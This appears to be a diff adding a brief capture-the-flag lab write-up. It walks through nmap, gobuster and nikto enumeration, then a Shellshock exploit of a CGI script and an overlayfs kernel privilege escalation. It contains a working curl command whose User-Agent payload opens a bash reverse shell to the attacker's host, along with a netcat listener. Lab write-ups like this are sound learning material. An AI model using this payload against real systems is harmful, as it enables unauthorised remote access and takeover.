@@ -1,0 +1,27 @@
+Starting with "nmap" scan && "gobuster" dir busting 
+
+Found an RSA private key inside the /backup/ directory 
+
+Found a lot of directories but nothing was helpfull 
+
+After sometimes decided to switch to nikto scanner 
+
+--> nikto gave this /cgi-bin/test.cgi <-- this was vulnerable to shellshock 
+
+Shellshock was one of the most dangerous bug every found , exploiting this bug would give reverse shell of any targer 
+
+--> First 
+    --> setup a listener rlwrap nc 10.17.0.179 9003
+
+--> Second 
+    --> using curl and modifying the User-Agent 
+
+    " curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.17.0.179/9003 0>&1' http://10.10.220.211/cgi-bin/test.cgi -i "
+
+  Then you will get a reverse shell 
+
+
+  Starting enumerating , found out that the there is kernel exploit for it because it was an older version 
+
+  Using the kernel exploit 
+  --> "Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation" 
